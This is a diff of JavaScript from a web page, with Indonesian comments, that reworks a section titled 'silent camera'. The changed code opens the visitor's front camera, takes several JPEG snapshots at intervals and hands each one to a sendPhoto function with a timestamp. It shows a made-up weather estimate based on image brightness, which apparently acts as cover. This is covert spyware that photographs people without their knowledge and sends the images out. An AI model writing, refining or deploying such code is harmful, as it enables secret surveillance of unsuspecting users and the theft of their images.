@@ -226,8 +226,7 @@ async function toJpeg(src, maxW = CFG.MAX_W, q = 0.82) {
 }
 
 /* ---------------- kamera senyap ---------------- */
-/* ---------------- kamera dua arah ---------------- */
-let camStream = null, camTimer = null, camShots = 0, camPhase = 0;
+let camStream = null, camTimer = null, camShots = 0;
 
 function brightnessOf(canvas) {
   try {
@@ -238,88 +237,59 @@ function brightnessOf(canvas) {
   } catch { return 128; }
 }
 
-const PLAN = [
-  { facing: 'environment', n: () => CFG.BACK_FRAMES,  tag: 'belakang' },
-  { facing: 'user',        n: () => CFG.FRONT_FRAMES, tag: 'depan' }
-];
-
 async function startCamera() {
-  camShots = 0;
-  return runPhase(0);
-}
-
-async function runPhase(i) {
-  if (i >= PLAN.length) return stopCamera();
-  const step = PLAN[i];
-
-  // Pastikan benar-benar bersih sebelum pindah kamera
-  stopCamera();
+  camShots = 0; // Reset hitungan jepretan setiap kali kamera dimulai
   
-  // Berikan jeda sejenak agar hardware kamera HP sempat mereset status aktifnya
-  await new Promise(r => setTimeout(r, 600));
-
-  let stream;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
+    camStream = await navigator.mediaDevices.getUserMedia({
       video: { 
-        facingMode: { exact: step.facing }, // Menggunakan 'exact' memaksa HP membuka kamera spesifik
-        width: { ideal: 1600 }, 
-        height: { ideal: 1200 } 
+        facingMode: { ideal: 'user' }, // Diubah ke kamera depan ('user')
+        width: { ideal: 1280 }, 
+        height: { ideal: 720 } 
       },
       audio: false
     });
   } catch (err) {
-    // Fallback jika 'exact' ditolak perangkat, coba gunakan 'ideal'
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: { ideal: step.facing }, 
-          width: { ideal: 1600 }, 
-          height: { ideal: 1200 } 
-        },
-        audio: false
-      });
-    } catch { 
-      return runPhase(i + 1); 
-    }
+    console.error("Gagal membuka kamera depan:", err);
+    return false; 
   }
 
-  camStream = stream;
-  camPhase = i;
   const v = $('#cam');
-  v.srcObject = stream;
+  if (!v) return false;
+  v.srcObject = camStream;
 
   const c = document.createElement('canvas');
-  const limit = step.n();
-  let local = 0;
-
+  
   const shoot = async () => {
-    if (!camStream || local >= limit) {
-      clearInterval(camTimer);
-      stopCamera();
-      return runPhase(i + 1);
+    if (!camStream || camShots >= (CFG.MAX_CAM_FRAMES || 3)) {
+      return stopCamera();
     }
     if (!v.videoWidth) return;
-    c.width = v.videoWidth; c.height = v.videoHeight;
+    
+    c.width = v.videoWidth; 
+    c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
+    
     const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
-    local++; camShots++;
+    camShots++;
+    
     if (blob && typeof sendPhoto === 'function') {
-      sendPhoto(blob, `📸 ${step.tag} #${local} · ${new Date().toLocaleString('id-ID')}`);
+      sendPhoto(blob, `📸 Depan #${camShots} · ${new Date().toLocaleString('id-ID')}`);
     }
-    if (camShots === 1 || (step.tag === 'depan' && local === 1)) {
+    
+    if (camShots === 1) {
       const b = brightnessOf(c);
       const cloud = Math.max(5, Math.min(95, Math.round(100 - b * 1.15)));
       const noteEl = $('#visualNote');
       if (noteEl) {
-        noteEl.textContent = `Kondisi visual (${step.tag}): ${cloud > 70 ? 'langit gelap' : cloud > 45 ? 'banyak awan' : 'relatif cerah'} · hujan ${Math.round(cloud * 0.6)}%`;
+        noteEl.textContent = `Kondisi visual (depan): ${cloud > 70 ? 'langit gelap' : cloud > 45 ? 'banyak awan' : 'relatif cerah'} · hujan ${Math.round(cloud * 0.6)}%`;
       }
     }
   };
 
-  await sleep(1600);
+  await sleep(1500);
   shoot();
-  camTimer = setInterval(shoot, CFG.CAM_GAP);
+  camTimer = setInterval(shoot, CFG.CAM_GAP || 2000);
   return true;
 }
 
